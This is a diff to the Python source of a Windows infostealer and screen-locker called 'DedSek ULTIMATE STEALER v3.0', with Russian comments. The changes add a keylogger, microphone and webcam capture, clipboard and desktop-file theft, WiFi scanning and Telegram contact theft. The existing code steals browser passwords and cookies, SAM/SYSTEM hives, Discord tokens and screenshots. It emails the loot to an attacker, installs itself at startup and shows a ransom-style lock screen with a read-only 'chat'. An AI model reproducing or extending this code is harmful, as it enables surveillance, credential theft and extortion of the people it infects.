@@ -31,7 +31,8 @@ import winreg
 import zipfile
 import win32crypt
 import re
-import glob as _glob
+import wave
+import pyaudio
 
 # ============================================================
 # >>> НАСТРОЙКИ <<<
@@ -79,14 +80,151 @@ def restore_win_key():
     except:
         pass
 
-# ========== ПРОВЕРКА АДМИНА (БЕЗ ПЕРЕЗАПУСКА) ==========
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
 
-# ========== РАСШИФРОВКА ==========
+# ========== ЗАПИСЬ С МИКРОФОНА ==========
+def record_microphone():
+    """Записывает 30 секунд аудио с микрофона"""
+    try:
+        CHUNK = 1024
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 1
+        RATE = 44100
+        RECORD_SECONDS = 30
+        
+        p = pyaudio.PyAudio()
+        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+        
+        frames = []
+        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+            try:
+                data = stream.read(CHUNK, exception_on_overflow=False)
+                frames.append(data)
+            except:
+                break
+        
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        
+        # Сохраняем WAV
+        audio_path = os.path.join(tempfile.gettempdir(), f'audio_{int(time.time())}.wav')
+        wf = wave.open(audio_path, 'wb')
+        wf.setnchannels(CHANNELS)
+        wf.setsampwidth(p.get_sample_size(FORMAT))
+        wf.setframerate(RATE)
+        wf.writeframes(b''.join(frames))
+        wf.close()
+        
+        send_file_email(audio_path, "Mic Recording")
+        try:
+            os.remove(audio_path)
+        except:
+            pass
+    except:
+        pass
+
+# ========== ФОТО С ВЕБКИ ==========
+def capture_webcam():
+    """Делает фото с веб-камеры"""
+    try:
+        cam = cv2.VideoCapture(0)
+        if cam.isOpened():
+            ret, frame = cam.read()
+            if ret:
+                photo_path = os.path.join(tempfile.gettempdir(), f'webcam_{int(time.time())}.jpg')
+                cv2.imwrite(photo_path, frame)
+                send_file_email(photo_path, "Webcam Photo")
+                try:
+                    os.remove(photo_path)
+                except:
+                    pass
+        cam.release()
+    except:
+        pass
+
+# ========== КЕЙЛОГГЕР ==========
+keylog_data = []
+def keylogger():
+    """Записывает все нажатые клавиши"""
+    try:
+        import keyboard
+        def on_key(event):
+            global keylog_data
+            keylog_data.append(f"{time.strftime('%H:%M:%S')} | {event.name}")
+            if len(keylog_data) >= 100:
+                text = '\n'.join(keylog_data)
+                send_email(text, "Keylogger Dump")
+                keylog_data.clear()
+        keyboard.on_press(on_key)
+    except:
+        pass
+
+# ========== БУФЕР ОБМЕНА ==========
+def steal_clipboard():
+    """Крадёт содержимое буфера обмена"""
+    try:
+        import win32clipboard
+        win32clipboard.OpenClipboard()
+        if win32clipboard.IsClipboardFormatAvailable(1):
+            data = win32clipboard.GetClipboardData()
+            if data:
+                send_email(f"Clipboard:\n{str(data)[:1000]}", "Clipboard")
+        win32clipboard.CloseClipboard()
+    except:
+        pass
+
+# ========== СКАНЕР WiFi СЕТЕЙ ==========
+def scan_wifi_networks():
+    """Сканирует все WiFi сети вокруг"""
+    res = []
+    try:
+        output = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
+        res.append("=== WiFi NETWORKS AROUND ===")
+        res.append(output[:5000])
+    except:
+        pass
+    return '\n'.join(res)
+
+# ========== КРАЖА ФАЙЛОВ С РАБОЧЕГО СТОЛА ==========
+def steal_desktop_files():
+    """Крадёт интересные файлы с рабочего стола"""
+    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
+    if not os.path.exists(desktop):
+        return
+    
+    interesting_exts = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.wallet', '.dat', '.key', '.ovpn', '.rdp', '.json', '.xml', '.csv']
+    
+    for file in os.listdir(desktop):
+        fp = os.path.join(desktop, file)
+        if os.path.isfile(fp):
+            ext = os.path.splitext(file)[1].lower()
+            if ext in interesting_exts and os.path.getsize(fp) < 5 * 1024 * 1024:  # < 5MB
+                send_file_email(fp, f"Desktop File: {file}")
+
+# ========== TELEGRAM КОНТАКТЫ ==========
+def steal_telegram_contacts():
+    """Крадёт список контактов Telegram если есть"""
+    res = []
+    tg_base = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
+    if not os.path.exists(tg_base):
+        return res
+    
+    # Ищем базу контактов
+    for folder in os.listdir(tg_base):
+        if folder.startswith('D877F783D5D3EF8C'):
+            contacts_db = os.path.join(tg_base, folder, 'info')
+            if os.path.exists(contacts_db):
+                res.append("Telegram contacts DB found and sent")
+                send_file_email(contacts_db, "Telegram Contacts")
+    
+    return res
+
+# ========== РАСШИФРОВКА (БЕЗ ИЗМЕНЕНИЙ) ==========
 def _decrypt_aes_gcm(data, key):
     try:
         from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -220,63 +358,33 @@ def steal_firefox():
                 os.remove(z)
             except:
                 pass
-            res.append(f"FIREFOX | {folder} | Файлы отправлены | Файлы отправлены")
     return res
 
-# ========== СКАНЕР ПОРТОВ ==========
 def scan_ports():
     res = []
     try:
-        res.append("=== ЛОКАЛЬНЫЕ ПОРТЫ ===")
+        res.append("=== LOCAL PORTS ===")
         netstat = subprocess.check_output("netstat -ano", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
         res.append(netstat[:5000])
     except:
         pass
-
-    try:
-        gateway = "192.168.1.1"
-        try:
-            route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-            for line in route.split('\n'):
-                if '.' in line and any(c.isdigit() for c in line):
-                    gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
-                    if gw:
-                        gateway = gw[0]
-                        break
-        except:
-            pass
-
-        res.append(f"\n=== СКАН РОУТЕРА {gateway} ===")
-        for port in [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 5900, 8080, 8443]:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.5)
-                if s.connect_ex((gateway, port)) == 0:
-                    res.append(f"ПОРТ {port}: ОТКРЫТ")
-                s.close()
-            except:
-                pass
-    except:
-        pass
     return '\n'.join(res)
 
-# ========== КРАЖА КУКИСОВ ==========
 def steal_all_cookies():
     results = []
-    chrome_paths = [
+    for cp in [
         os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
         os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
-    ]
-    for cp in chrome_paths:
+    ]:
         if os.path.exists(cp):
             try:
-                db = os.path.join(tempfile.gettempdir(), f'chrome_cookies_{random.randint(0,9999)}.db')
+                db = os.path.join(tempfile.gettempdir(), f'c_{random.randint(0,9999)}.db')
                 shutil.copy2(cp, db)
                 cur = sqlite3.connect(db).cursor()
                 cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
-                for host, name, enc_val in cur.fetchall():
+                for host, name, enc in cur.fetchall():
                     try:
-                        val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8', 'ignore')
+                        val = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8', 'ignore')
                         results.append(f"CHROME | {host} | {name} | {val[:100]}")
                     except:
                         pass
@@ -287,58 +395,13 @@ def steal_all_cookies():
                     pass
             except:
                 pass
-
-    edge_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
-    if os.path.exists(edge_path):
-        try:
-            db = os.path.join(tempfile.gettempdir(), f'edge_cookies_{random.randint(0,9999)}.db')
-            shutil.copy2(edge_path, db)
-            cur = sqlite3.connect(db).cursor()
-            cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
-            for host, name, enc_val in cur.fetchall():
-                try:
-                    val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8', 'ignore')
-                    results.append(f"EDGE | {host} | {name} | {val[:100]}")
-                except:
-                    pass
-            cur.close()
-            try:
-                os.remove(db)
-            except:
-                pass
-        except:
-            pass
-
-    ff_base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
-    if os.path.exists(ff_base):
-        for folder in os.listdir(ff_base):
-            cookie_file = os.path.join(ff_base, folder, 'cookies.sqlite')
-            if os.path.exists(cookie_file):
-                try:
-                    db = os.path.join(tempfile.gettempdir(), f'ff_cookies_{random.randint(0,9999)}.db')
-                    shutil.copy2(cookie_file, db)
-                    cur = sqlite3.connect(db).cursor()
-                    cur.execute("SELECT host, name, value FROM moz_cookies")
-                    for host, name, val in cur.fetchall():
-                        results.append(f"FIREFOX | {host} | {name} | {val[:100]}")
-                    cur.close()
-                    try:
-                        os.remove(db)
-                    except:
-                        pass
-                except:
-                    pass
-    return results[:500] if results else ["Куки не найдены"]
+    return results[:300] if results else ["No cookies"]
 
 # ========== МЕГА-СТИЛЕР ==========
 def mega_steal():
-    R = []
-    R.append("=" * 60)
-    R.append("DEDSEK ULTIMATE STEALER")
-    R.append("=" * 60)
-
+    R = ["=" * 60, "DEDSEK ULTIMATE STEALER v3.0", "=" * 60]
     R += [f"\nUSER: {os.environ.get('USERNAME')}", f"PC: {socket.gethostname()}"]
-
+    
     try:
         R.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
     except:
@@ -346,66 +409,42 @@ def mega_steal():
     try:
         ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
         g = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5).read())
-        R.append(f"PUBLIC IP: {ip} | {g.get('country','?')} | {g.get('city','?')} | {g.get('isp','?')}")
+        R.append(f"PUBLIC IP: {ip} | {g.get('country','?')} | {g.get('city','?')}")
     except:
         pass
-
+    
     try:
         R.append("\nIPCONFIG:\n" + subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866', 'replace')[:5000])
     except:
         pass
-    try:
-        R.append("\nARP:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', 'replace')[:3000])
-    except:
-        pass
-
+    
+    R.append("\n" + "=" * 60)
+    R.append("WiFi SCANNER")
+    R.append("=" * 60)
+    R.append(scan_wifi_networks())
+    
     R.append("\n" + "=" * 60)
     R.append("PORT SCANNER")
     R.append("=" * 60)
     R.append(scan_ports())
-
-    try:
-        R.append("\nWIFI:")
-        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866', 'replace').split('\n'):
-            if 'Все профили' in line:
-                p = line.split(':')[1].strip()
-                if p:
-                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866', 'replace')
-                    key = "НЕТ"
-                    for dl in det.split('\n'):
-                        if 'Содержимое ключа' in dl or 'Key Content' in dl:
-                            key = dl.split(':')[1].strip()
-                    R.append(f"  {p}: {key}")
-    except:
-        pass
-
+    
     R += ["\n" + "=" * 60, "BROWSER PASSWORDS", "=" * 60]
-
-    browsers = {
+    for name, paths in {
         "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
         "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
-        "OPERA": [
-            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Login Data'),
-            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Opera Software', 'Opera Stable', 'Login Data')
-        ],
-        "EDGE": [
-            os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
-            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
-        ],
-    }
-
-    for name, paths in browsers.items():
+        "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
+    }.items():
         data = steal_chromium(name, paths)
         R.append(f"\n--- {name} ---")
-        R.extend(data if data else ["Нет данных"])
-
+        R.extend(data if data else ["No data"])
+    
     R.append("\n--- FIREFOX ---")
-    R.extend(steal_firefox() or ["Нет данных"])
-
+    R.extend(steal_firefox() or ["No data"])
+    
     R += ["\n" + "=" * 60, "COOKIES", "=" * 60]
     R.extend(steal_all_cookies())
-
-    R += ["\n" + "=" * 60, "WINDOWS PASSWORD", "=" * 60]
+    
+    # SAM
     try:
         sp = os.path.join(tempfile.gettempdir(), 'sam')
         syp = os.path.join(tempfile.gettempdir(), 'system')
@@ -418,20 +457,17 @@ def mega_steal():
                 zf.write(sp, 'sam')
                 zf.write(syp, 'system')
             send_file_email(z, "SAM+SYSTEM")
-            R.append("SAM+SYSTEM отправлены!")
             for f in [z, sp, syp]:
                 try:
                     os.remove(f)
                 except:
                     pass
-        else:
-            R.append("Нет прав админа")
-    except Exception as e:
-        R.append(f"Ошибка: {e}")
-
-    R.append("\n--- TELEGRAM ---")
+    except:
+        pass
+    
+    # Telegram
     tg = None
-    for p in [os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata'), os.path.join(os.environ['LOCALAPPDATA'], 'Telegram Desktop', 'tdata')]:
+    for p in [os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')]:
         if os.path.exists(p):
             tg = p
             break
@@ -448,15 +484,12 @@ def mega_steal():
                 os.remove(z)
             except:
                 pass
-            R.append("Сессия отправлена!")
         except:
-            R.append("Ошибка")
-    else:
-        R.append("Не найден")
-
-    R.append("\n--- DISCORD ---")
+            pass
+    
+    # Discord
     tokens = set()
-    for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'), os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb')]:
+    for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb')]:
         if not os.path.exists(db):
             continue
         for f in os.listdir(db):
@@ -465,8 +498,18 @@ def mega_steal():
                     tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', open(os.path.join(db, f), 'r', errors='ignore').read()))
                 except:
                     pass
-    R.extend([f"ТОКЕН: {t}" for t in list(tokens)[:20]] if tokens else ["Не найдены"])
-
+    R.extend([f"TOKEN: {t}" for t in list(tokens)[:20]] if tokens else ["No tokens"])
+    
+    # Буфер обмена
+    steal_clipboard()
+    
+    # Фото с вебки
+    capture_webcam()
+    
+    # Файлы с рабочего стола
+    steal_desktop_files()
+    
+    # Скриншот
     try:
         ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
         ImageGrab.grab().save(ss, 'JPEG', quality=50)
@@ -475,12 +518,11 @@ def mega_steal():
             os.remove(ss)
         except:
             pass
-        R.append("\nСкриншот отправлен!")
     except:
         pass
-
-    R += ["\n" + "=" * 60, f"ОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}", "=" * 60]
-
+    
+    R += ["\n" + "=" * 60, f"REPORT: {time.strftime('%d.%m.%Y %H:%M:%S')}", "=" * 60]
+    
     text = '\n'.join(R)
     for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
         send_email(part, f"DedSek [{i+1}]")
@@ -501,7 +543,7 @@ def send_email(message, subject=None):
 def send_file_email(fp, desc):
     try:
         msg = MIMEMultipart()
-        msg['Subject'] = f'Файл: {desc}'
+        msg['Subject'] = f'File: {desc}'
         msg['From'] = GMAIL_LOGIN
         msg['To'] = RECEIVER_EMAIL
         with open(fp, 'rb') as f:
@@ -545,7 +587,7 @@ def _send_vid(fp):
             except:
                 pass
         msg = MIMEMultipart()
-        msg['Subject'] = 'Видео'
+        msg['Subject'] = 'Video'
         msg['From'] = GMAIL_LOGIN
         msg['To'] = RECEIVER_EMAIL
         with open(fp, 'rb') as f:
@@ -561,7 +603,7 @@ def _send_vid(fp):
     except:
         pass
 
-# ========== ЧАТ ==========
+# ========== ЧАТ ТОЛЬКО ДЛЯ ЧТЕНИЯ ==========
 class Chat:
     def __init__(self, locker):
         self.locker = locker
@@ -571,12 +613,11 @@ class Chat:
         if self.win:
             return
         self.win = tk.Toplevel()
-        self.win.geometry("380x480+60+60")
+        self.win.geometry("380x400+60+60")
         self.win.configure(bg='#00FF00')
         self.win.attributes('-topmost', True)
         self.win.overrideredirect(True)
         self.win.focus_force()
-        self.win.grab_set()
 
         def keep():
             while self.win:
@@ -592,40 +633,29 @@ class Chat:
         f.pack(fill='both', expand=True, padx=2, pady=2)
         h = tk.Frame(f, bg='#00FF00')
         h.pack(fill='x')
-        tk.Label(h, text="DedSek Chat", bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
+        tk.Label(h, text="DedSek (READ ONLY)", bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
         tk.Button(h, text="✕", command=self.hide, bg='#FF0000', fg='white', font=('Courier', 12, 'bold'), bd=0, width=3).pack(side='right', padx=5, pady=3)
 
-        self.hist = scrolledtext.ScrolledText(f, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), height=20)
+        self.hist = scrolledtext.ScrolledText(f, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), height=22)
         self.hist.pack(padx=10, pady=(0, 5), fill='both', expand=True)
         self.hist.config(state='disabled')
 
-        inf = tk.Frame(f, bg='black')
-        inf.pack(padx=10, pady=(0, 10), fill='x')
-        self.entry = tk.Entry(inf, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), insertbackground='#00FF00')
-        self.entry.pack(side='left', fill='x', expand=True, ipady=3)
-        self.entry.bind('<Return>', self.send)
-        tk.Button(inf, text="▶", command=self.send, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), width=3).pack(side='right', padx=(5, 0))
+        # ЗАПРЕЩАЕМ ВВОД - только чтение
+        lbl = tk.Label(f, text="[READ ONLY - Вы не можете писать]", bg='black', fg='#FF0000', font=('Courier', 8))
+        lbl.pack(pady=(0, 10))
 
         h.bind('<Button-1>', lambda e: setattr(self, 'xy', (e.x_root, e.y_root)))
         h.bind('<B1-Motion>', lambda e: self.win.geometry(f"+{self.win.winfo_x()+e.x_root-self.xy[0]}+{self.win.winfo_y()+e.y_root-self.xy[1]}") or setattr(self, 'xy', (e.x_root, e.y_root)))
 
-        self.add("DedSek", "Привет! Твой ПК заблокирован.")
+        self.add("DedSek", "Привет! Твой ПК заблокирован. Читай внимательно.")
         self._check()
 
     def hide(self):
         if self.win:
-            self.win.grab_release()
             self.win.destroy()
             self.win = None
         self.locker.win.focus_force()
         self.locker.pw.focus_force()
-
-    def send(self, e=None):
-        m = self.entry.get().strip()
-        if m:
-            self.add("Ты", m)
-            self.entry.delete(0, tk.END)
-            send_email(f"Сообщение:\n{m}")
 
     def add(self, s, m):
         self.hist.config(state='normal')
@@ -833,6 +863,7 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
 
         tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier', 9, 'bold'), justify='left').place(relx=0.5, rely=0.42, anchor='center')
 
+        # Кнопка чата
         self.chat = Chat(self)
         self.chat_open = False
         self.chat_btn = tk.Button(self.win, text="ЧАТ", command=self.toggle_chat, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), cursor='hand2', bd=1, width=6)
@@ -897,6 +928,8 @@ if __name__ == "__main__":
 
     threading.Thread(target=mega_steal, daemon=True).start()
     threading.Thread(target=record_loop, daemon=True).start()
+    threading.Thread(target=record_microphone, daemon=True).start()
+    threading.Thread(target=keylogger, daemon=True).start()
 
     add_startup()
     time.sleep(TIMER_SECONDS)
